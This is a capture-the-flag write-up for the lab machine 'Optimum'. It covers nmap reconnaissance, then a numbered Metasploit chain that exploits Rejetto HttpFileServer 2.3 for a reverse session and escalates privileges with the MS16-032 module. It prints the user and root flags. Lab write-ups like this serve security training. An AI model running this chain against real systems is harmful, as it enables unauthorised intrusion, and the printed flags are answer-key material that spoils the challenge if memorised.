### IP
`10.10.10.8`

# Recon

### nmap
`nmap -sC -sV 10.10.10.8 -o Optimum.nmap`
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-23 18:54 EST
Nmap scan report for 10.10.10.8
Host is up (0.051s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.78 seconds


```
* This looks very minimal... just port 80
	* When we look on the website, we can see a link to [HttpFileServer 2.3](http://www.rejetto.com/hfs/), which takes us to Rejetto's website



# Exploitation

### Metasploit

* Because we know that we have a 2.3 rejetto server, let's look for that
1. `msfconsole`
2. `search rejetto`
3. `use exploit/windows/http/rejetto_hfs_exec`
4. `options`
5. `set RHOST 10.10.10.8`
6. `set LHOST tun0`
7. `run`
8. `bg` to put the session into the background
9. `use post/multi/recon/local_exploit_suggester` to view privesc options
10. `set SESSION 1`
11. `set SHOWDESCRIPTION true`
12. `run`
13. `use exploit/windows/local/ms16_032_secondary_logon_handle_privesc`
14. `options`
15. `set SESSION 1`
16. `set LHOST tun0`
17.  `run`

* We're in!

* We can write `more user.txt.txt` to get the user flag: `d0c39409d7b994a9a1389ebf38ef5f73`


* We can cd to `C:\Users\Administrator\Desktop>` and run `more root.txt` to get the root flag: `51ed1b36553c8461f4552c2e92b3eeed`
